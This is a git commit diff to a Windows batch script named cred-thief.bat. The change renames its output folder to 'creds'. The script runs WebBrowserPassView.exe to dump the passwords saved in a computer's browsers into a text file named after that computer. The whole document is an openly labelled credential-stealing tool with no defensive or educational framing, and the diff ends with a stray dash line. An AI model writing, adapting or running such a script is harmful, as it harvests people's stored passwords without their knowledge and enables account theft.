e385ca2d1346dfedafde95a60c249c581e5a2874
oplogix <tyus.ashworth@gmail.com>
2023-03-12 14:13:39 -0400

    Update cred-thief.bat

--- cred-thief.bat
+++ cred-thief.bat
@@ -1,7 +1,8 @@
 @echo off
 
-:: Creates a folder called log only if the folder does not already exist.
+:: Creates a folder called creds only if the folder does not already exist.
 mkdir creds
 
 :: The command below runs WebBrowserPassView.exe and exports the results as text documents using the naming conventione WebBrowserPassView.exe-ComputerName
-start WebBrowserPassView.exe /stext .\log\WebBrowserPassView-%computername%.txt
+start WebBrowserPassView.exe /stext .\creds\WebBrowserPassView-%computername%.txt
+-
